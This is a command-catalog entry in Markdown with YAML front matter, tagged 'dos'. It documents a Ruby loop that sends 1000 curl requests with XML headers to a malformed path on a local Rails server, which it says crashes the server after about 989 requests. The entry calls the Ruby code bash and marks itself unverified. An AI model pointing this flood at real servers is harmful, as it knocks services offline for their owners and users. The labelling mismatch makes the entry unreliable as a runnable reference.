---
id: cmd-uuid-2
data: >-
  1000.times.each do |n| `curl -H "Accept: application/xml" -H "Content-Type:
  application/xml" -X GET
  http://localhost:3000///wp1/wp-includes/wlwmanifest.xml` end
tags:
  - dos
  - curl
type: command
output: 'HTTP 404 responses initially, crash after ~989 requests'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:36.499Z'
verified: false
validated: true
submitted: true
---
# Send Repeated Malformed Requests via Curl

## Command

```bash
1000.times.each do |n| `curl -H "Accept: application/xml" -H "Content-Type: application/xml" -X GET http://localhost:3000///wp1/wp-includes/wlwmanifest.xml` end
```

## Description

A Ruby loop sending 1000 GET requests with XML headers to a malformed path, triggering 404 exceptions to mutate Rails response constants.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 1000.times.each | Loops 1000 times | Yes |
| `curl ...` | Executes curl in backticks | Yes |
| -H "Accept: application/xml" | Sets Accept header | Yes |
| -H "Content-Type: application/xml" | Sets Content-Type header | Yes |
| -X GET | Specifies GET method | Yes |
| http://localhost:3000///wp1/wp-includes/wlwmanifest.xml | Malformed URL for 404 | Yes |

## Examples

### Basic Usage

```bash
10.times.each do |n| `curl http://localhost:3000/badpath` end
```

### Advanced Usage

```bash
1000.times.each do |n| `curl -H "Accept: application/xml" http://localhost:3000///bad` end
```

## Expected Output

Series of 404 responses; after threshold, server error and crash.

## Related

- [[commands/start-rails-server-production]]
